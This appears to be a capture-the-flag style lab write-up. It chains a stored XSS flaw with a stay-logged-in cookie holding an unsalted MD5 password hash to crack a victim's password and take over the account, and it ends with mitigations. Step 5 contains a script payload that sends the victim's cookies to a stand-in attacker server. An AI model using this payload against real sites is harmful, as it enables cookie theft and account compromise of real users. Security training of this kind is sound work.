# Offline Password Cracking via Cookie Exposure and Stored XSS

## Summary

The application implements a persistent login mechanism that stores a password-derived hash inside a cookie. Additionally, the application contains a stored Cross-Site Scripting (XSS) vulnerability in the comment functionality. By exploiting the XSS vulnerability, an attacker can steal another user’s authentication cookie, extract the password hash, and perform offline password cracking to recover the plaintext password and fully compromise the account.

## Root Cause

Two independent security weaknesses combine to create a critical vulnerability:

1. **Insecure cookie design**
   The `stay-logged-in` cookie contains a deterministic value:

   ```
   username:md5(password)
   ```

   This exposes a password-derived hash directly to the client.

2. **Stored XSS vulnerability**
   User input in blog comments is not properly sanitized, allowing arbitrary JavaScript execution in the victim’s browser and enabling cookie exfiltration.

Because the password hash is:

* unsalted,
* generated using MD5,
* exposed client-side,

attackers can perform **offline password cracking** after stealing the cookie.

## Exploitation Steps

1. Log in using valid credentials (`wiener:peter`) and enable the **Stay logged in** option.
2. Inspect the response and observe that the `stay-logged-in` cookie is Base64 encoded.
3. Decode the cookie and identify the structure:

   ```
   username:md5(password)
   ```
4. Identify that the blog comment functionality is vulnerable to **stored XSS**.
5. Post a malicious comment containing a payload that exfiltrates cookies to an attacker-controlled server:

   ```html
   <script>document.location='//ATTACKER-SERVER/'+document.cookie</script>
   ```
6. Wait for the victim (`carlos`) to load the page and trigger the payload.
7. Capture the incoming request on the exploit server and extract the victim’s `stay-logged-in` cookie.
8. Decode the cookie and obtain:

   ```
   carlos:<md5_hash>
   ```
9. Perform offline cracking of the hash (e.g., using public hash databases or a wordlist).
10. Recover the plaintext password.
11. Log in as `carlos` and delete the account from the **My account** page.

## Impact

**Severity:** Critical (Account Takeover + Credential Disclosure)

Attackers can:

* Steal authentication cookies via XSS.
* Recover plaintext passwords through offline cracking.
* Fully compromise user accounts.

This vulnerability also increases risk beyond a single application if users reuse passwords across services.

## Mitigation

* Never store password hashes (or password-derived values) inside client-side cookies.
* Replace persistent login cookies with securely generated random tokens.
* Store persistent tokens server-side and bind them to user sessions.
* Use strong password hashing algorithms (e.g., bcrypt, Argon2) with proper salting.
* Implement output encoding and input sanitization to prevent XSS.
* Apply HttpOnly and Secure flags to authentication cookies.

## Key Takeaway

Authentication and client-side security controls are interconnected. Even a single XSS vulnerability can escalate into full account compromise when sensitive authentication data is exposed in cookies. Password-derived values should never be accessible to the client.
